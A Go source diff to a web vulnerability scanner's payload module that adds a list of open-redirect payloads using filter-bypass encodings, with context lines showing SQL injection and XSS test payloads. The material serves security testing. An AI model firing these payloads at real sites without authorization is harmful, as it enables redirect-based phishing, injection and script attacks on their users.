@@ -2,6 +2,61 @@ package scanning
 
 import "strings"
 
+//basic open redirect payloads
+func getOpenRedirectPayload() []string {
+	payload := []string{
+		"//google.com/%2f..",
+		"///google.com/%2f..",
+		"////google.com/%2f..",
+		"https://google.com/%2f..",
+		"/https://google.com/%2f..",
+		"//www.google.com/%2f%2e%2e",
+		"///www.google.com/%2f%2e%2e",
+		"////www.google.com/%2f%2e%2e",
+		"https://www.google.com/%2f%2e%2e",
+		"/https://www.google.com/%2f%2e%2e",
+		"//google.com/",
+		"///google.com/",
+		"////google.com/",
+		"https://google.com/",
+		"/https://google.com/",
+		"//google.com//",
+		"///google.com//",
+		"////google.com//",
+		"https://google.com//",
+		"//https://google.com//",
+		"//www.google.com/%2e%2e%2f",
+		"///www.google.com/%2e%2e%2f",
+		"////www.google.com/%2e%2e%2f",
+		"https://www.google.com/%2e%2e%2f",
+		"//https://www.google.com/%2e%2e%2f",
+		"///www.google.com/%2e%2e",
+		"////www.google.com/%2e%2e",
+		"https:///www.google.com/%2e%2e",
+		"//https:///www.google.com/%2e%2e",
+		"/https://www.google.com/%2e%2e",
+		"///www.google.com/%2f%2e%2e",
+		"////www.google.com/%2f%2e%2e",
+		"https:///www.google.com/%2f%2e%2e",
+		"/https://www.google.com/%2f%2e%2e",
+		"/https:///www.google.com/%2f%2e%2e",
+		"/%09/google.com",
+		"//%09/google.com",
+		"///%09/google.com",
+		"////%09/google.com",
+		"https://%09/google.com",
+		"/%5cgoogle.com",
+		"//%5cgoogle.com",
+		"///%5cgoogle.com",
+		"////%5cgoogle.com",
+		"https://%5cgoogle.com",
+		"/https://%5cgoogle.com",
+		"https://google.com",
+	}
+	return payload
+}
+
+
 //basic sql injection payloads
 func getSQLIPayload() []string {
 	payload := []string{
@@ -26,7 +81,6 @@ func getSQLIPayload() []string {
 		"'LIKE'",
 		"'=0--+",
 		"%00",
-		"/*…*/",
 		" AND 1",
 		" AND 0",
 		" AND true",
@@ -139,7 +193,6 @@ func getHTMLPayload(ip string) []string {
 		"<iFrAme/src=jaVascRipt:alert(45) class=dalfox></iFramE>",
 		"<xmp><p title=\"</xmp><svg/onload=alert(45) class=dalfox>",
 		"<dalfox class=dalfox>",
-
 		"<sVg/onload=prompt(45)>",
 		"<Svg/onload=alert(45)>",
 		"<svG/onload=confirm(45)>",
